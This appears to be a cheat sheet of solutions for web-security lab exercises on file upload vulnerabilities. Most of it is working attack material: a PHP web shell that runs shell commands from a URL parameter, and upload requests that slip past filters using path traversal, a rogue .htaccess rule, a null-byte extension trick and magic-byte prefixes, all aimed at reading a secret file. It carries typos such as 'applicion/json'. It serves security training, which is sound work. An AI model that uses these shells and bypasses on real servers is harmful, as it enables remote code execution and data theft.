# Upload Vulnerabilities

PHP Shell

```
<?php echo system($_GET['cmd']); ?>
```

## Web shell upload via path traversal

Uplaod the shell to a different directory using a relative file path.

Note: filename path needs to be url encoded.

```
------WebKitFormBoundaryzNppShFAZ3ca6Z0r
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fshell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundaryzNppShFAZ3ca6Z0r
```

## Web shell upload via extension blacklist bypass

Upload a custom `.htaccess` file to execute jsons:

```
------WebKitFormBoundaryMjXnqjB1fMpIkVxW
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: applicion/json

AddType application/x-httpd-php .json

------WebKitFormBoundaryMjXnqjB1fMpIkVxW
```

## Web shell upload via obfuscated file extension

```
Content-Disposition: form-data; name="avatar"; filename="index.php%00.png"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundaryotJoUdbZVyP8AdpK
```

## Flawed validation of the file's contents

JPEG magic bytes: `FF D8 FF`.

```sh
# PNG magic bytes + PHP code
echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_GET["cmd"]); ?>' > shell.php

# JPEG magic bytes + PHP code
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.php

# GIF magic bytes + PHP code
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php

# PDF magic bytes + PHP code
echo '%PDF-1.5<?php system($_GET["cmd"]); ?>' > shell.php

# ZIP magic bytes
printf '\x50\x4B\x03\x04<?php system($_GET["cmd"]); ?>' > shell.php
```

Access secret file: `files/avatars/shell-jpg.php?cmd=cat%20/home/carlos/secret`

